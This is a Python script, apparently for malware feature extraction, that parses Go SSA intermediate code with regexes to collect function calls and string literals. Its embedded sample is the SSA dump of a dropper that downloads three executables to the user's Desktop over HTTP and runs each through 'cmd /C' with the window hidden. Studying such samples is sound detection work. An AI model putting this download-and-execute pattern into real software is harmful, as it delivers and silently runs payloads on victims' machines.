import re

# 示例代码
code = """
Function: func init():
Processed Blocks:
t0 = *init$guard
if t0 goto 2 else 1

*init$guard = true:bool
t1 = net/http.init()
t2 = github.com/gobuffalo/packr.init()
t3 = io.init()
t4 = os/exec.init()
t5 = fmt.init()
t6 = os.init()
t7 = syscall.init()
t8 = os/user.init()
t9 = log.init()
jump 2


Function: func main():
Processed Blocks:
go HostFiles()
t0 = os/user.Current()
t1 = extract t0 #0
t2 = extract t0 #1
t3 = t2 != nil:error
if t3 goto 1 else 2

t4 = new [1]any (varargs)
t5 = &t4[0:int]
t6 = change interface any <- error (t2)
*t5 = t6
t7 = slice t4[:]
t8 = log.Println(t7...)
jump 2

t9 = &t1.HomeDir [#4]
t10 = *t9
t11 = new [1]any (varargs)
t12 = &t11[0:int]
t13 = make any <- string (t10)
*t12 = t13
t14 = slice t11[:]
t15 = fmt.Println(t14...)
t16 = &t1.HomeDir [#4]
t17 = *t16
t18 = t17 + "\\Desktop\\e.exe":string
t19 = &t1.HomeDir [#4]
t20 = *t19
t21 = t20 + "\\Desktop\\o.exe":string
t22 = &t1.HomeDir [#4]
t23 = *t22
t24 = t23 + "\\Desktop\\s.exe":string
t25 = DownloadFile(t18, "http://127.0.0.1:...":string)
t26 = DownloadFile(t21, "http://127.0.0.1:...":string)
t27 = DownloadFile(t24, "http://127.0.0.1:...":string)
t28 = new [2]string (varargs)
t29 = &t28[0:int]
*t29 = "/C":string
t30 = &t28[1:int]
*t30 = t24
t31 = slice t28[:]
t32 = os/exec.Command("cmd":string, t31...)
t33 = new syscall.SysProcAttr (complit)
t34 = &t33.HideWindow [#0]
*t34 = true:bool
t35 = &t32.SysProcAttr [#8]
*t35 = t33
t36 = (*os/exec.Cmd).Start(t32)
t37 = t36 != nil:error
if t37 goto 3 else 4

t38 = new [1]any (varargs)
t39 = &t38[0:int]
t40 = change interface any <- error (t36)
*t39 = t40
t41 = slice t38[:]
t42 = log.Println(t41...)
jump 4

t43 = new [2]string (varargs)
t44 = &t43[0:int]
*t44 = "/C":string
t45 = &t43[1:int]
*t45 = t18
t46 = slice t43[:]
t47 = os/exec.Command("cmd":string, t46...)
t48 = new syscall.SysProcAttr (complit)
t49 = &t48.HideWindow [#0]
*t49 = true:bool
t50 = &t47.SysProcAttr [#8]
*t50 = t48
t51 = (*os/exec.Cmd).Start(t47)
t52 = t51 != nil:error
if t52 goto 5 else 6

t53 = new [1]any (varargs)
t54 = &t53[0:int]
t55 = change interface any <- error (t51)
*t54 = t55
t56 = slice t53[:]
t57 = log.Println(t56...)
jump 6

t58 = new [2]string (varargs)
t59 = &t58[0:int]
*t59 = "/C":string
t60 = &t58[1:int]
*t60 = t21
t61 = slice t58[:]
t62 = os/exec.Command("cmd":string, t61...)
t63 = new syscall.SysProcAttr (complit)
t64 = &t63.HideWindow [#0]
*t64 = true:bool
t65 = &t62.SysProcAttr [#8]
*t65 = t63
t66 = (*os/exec.Cmd).Start(t62)
t67 = t66 != nil:error
if t67 goto 7 else 8

t68 = new [1]any (varargs)
t69 = &t68[0:int]
t70 = change interface any <- error (t66)
*t69 = t70
t71 = slice t68[:]
t72 = log.Println(t71...)
jump 8


Function: func HostFiles():
Processed Blocks:

Function: func DownloadFile(filepath string, url string) error:
Processed Blocks:
t0 = local error ()
t1 = os.Create(filepath)
t2 = extract t1 #0
t3 = extract t1 #1
t4 = t3 != nil:error
if t4 goto 1 else 2

*t0 = t3
rundefers
t5 = *t0
return t5

defer (*os.File).Close(t2)
t6 = net/http.Get(url)
t7 = extract t6 #0
t8 = extract t6 #1
t9 = t8 != nil:error
if t9 goto 4 else 5

t10 = *t0
return t10

*t0 = t8
rundefers
t11 = *t0
return t11

t12 = &t7.Body [#6]
t13 = *t12
defer invoke t13.Close()
t14 = &t7.Body [#6]
t15 = *t14
t16 = make io.Writer <- *os.File (t2)
t17 = change interface io.Reader <- io.ReadCloser (t15)
t18 = io.Copy(t16, t17)
t19 = extract t18 #0
t20 = extract t18 #1
t21 = t20 != nil:error
if t21 goto 6 else 7

*t0 = t20
rundefers
t22 = *t0
return t22

t23 = println("Downloaded file":string)
*t0 = nil:error
rundefers
t24 = *t0
return t24
"""


def parse_code(code):
    calls = []
    strings = []

    # 解析代码
    for line in code.splitlines():
        if '=' in line:
            right_side = line.split('=')[1]

            # 提取函数调用
            call_matches = re.finditer(r'(\S+?)\((.*?)\)', right_side)
            for match in call_matches:
                calls.append(match.group(1))

            # 提取属性访问
            property_matches = re.finditer(r'&(\S+)\.(\S+) \[#', right_side)
            for match in property_matches:
                calls.append(match.group(2))

            # 提取字符串
            strings_match = re.findall(r'"(.*?)"(?=:string)', right_side)
            strings.extend(strings_match)

    return {"calls": calls, "strings": strings}


# info = parse_code(code)
# print("Function Calls:", info["calls"])
# print("Strings:", info["strings"])
